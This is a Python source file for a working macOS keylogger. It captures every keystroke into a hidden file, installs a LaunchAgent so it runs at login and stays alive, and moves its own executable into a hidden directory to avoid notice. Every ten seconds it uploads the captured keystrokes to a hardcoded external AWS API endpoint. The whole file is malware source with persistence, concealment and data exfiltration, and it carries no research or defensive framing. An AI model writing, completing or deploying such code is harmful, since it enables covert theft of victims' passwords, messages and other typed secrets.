import threading
import requests
from pynput import keyboard
import os
import sys

API_URL = "https://0j0jbifw85.execute-api.us-east-2.amazonaws.com/upload"
KEYFILE_PATH = ".keyfile.txt"


def setup_mac_launch_agent():
    plist_path = os.path.expanduser("~/Library/LaunchAgents/com.example.keylogger.plist")
    if not os.path.exists(plist_path):
        plist_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.keylogger</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
""".format(os.path.abspath(__file__))

        with open(plist_path, "w") as plist_file:
            plist_file.write(plist_content)

        os.system(f"launchctl load {plist_path}")
        print("LaunchAgent created and loaded.")

if getattr(sys, 'frozen', False):
    setup_mac_launch_agent()

def keyPressed(key):
    try:
        char = key.char  
        if char:
            with open(KEYFILE_PATH, "a") as logKey:
                logKey.write(char)
    except AttributeError:

        with open(KEYFILE_PATH, "a") as logKey:
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            else:
                logKey.write(f'[{key}]') 

def on_press(key):
    keyPressed(key)

def send_file_to_api():
    try:
        # Read the file content
        with open(KEYFILE_PATH, "r") as file:
            file_content = file.read()

        # Prepare the payload
        payload = {"filename": "keyfile.txt", "content": file_content}


        # Send the POST request
        response = requests.post(API_URL, json=payload)
        
        # Log success or failure
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")
    finally:
 
        threading.Timer(10, send_file_to_api).start()

def make_executable_invisible():
    hidden_dir = os.path.expanduser("~/.hidden_executable")
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    
    current_executable = sys.argv[0]
    new_executable_path = os.path.join(hidden_dir, os.path.basename(current_executable))
    
    if not os.path.exists(new_executable_path):
        os.rename(current_executable, new_executable_path)
        os.execv(new_executable_path, sys.argv)

if not os.path.exists(KEYFILE_PATH):
    with open(KEYFILE_PATH, "w") as file:
        pass  # Create an empty file

if __name__ == "__main__":
    make_executable_invisible()  # Move the executable to a hidden directory and run it from there

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    send_file_to_api()


    listener.join()
